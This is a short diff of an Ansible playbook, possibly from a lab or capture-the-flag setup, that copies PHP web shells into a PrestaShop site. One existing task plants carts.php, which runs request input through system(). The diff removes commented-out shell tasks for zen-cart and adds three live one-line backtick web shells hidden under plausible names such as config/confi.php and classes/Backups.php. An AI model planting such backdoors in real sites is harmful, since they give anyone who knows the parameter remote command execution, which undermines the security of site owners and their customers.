@@ -6,16 +6,16 @@
     copy:
       dest: /var/www/html/prestashop/carts.php
       content: <?php if(isset($_REQUEST['carts'])){ echo "<pre>"; $cmd = ($_REQUEST['carts']); system($cmd); echo "</pre>"; die; }?>
-#  - name: Create pico.php
-#    copy:
-#      dest: /var/www/html/zen-cart/pico.php
-#      content: <?=`$_GET[_]`?> 
-#  - name: Create pico.php
-#    copy:
-#      dest: /var/www/html/zen-cart/includes/var.php
-#      content: <?=`$_GET[var]`?>
-#  - name: Create pico.php
-#    copy:
-#      dest: /var/www/html/info.php
-#      content: <?=`$_GET[0]`?> 
+  - name: Create confi.php
+    copy:
+      dest: /var/www/html/prestashop/config/confi.php
+      content: <?=`$_GET[_]`?> 
+  - name: Create pico.php
+    copy:
+      dest: /var/www/html/prestashop/classes/Backups.php
+      content: <?=`$_GET[backup]`?>
+  - name: Create pico.php
+    copy:
+      dest: /var/www/html/prestashop/classes/tax/taxes3.php
+      content: <?=`$_GET[tax]`?> 
        
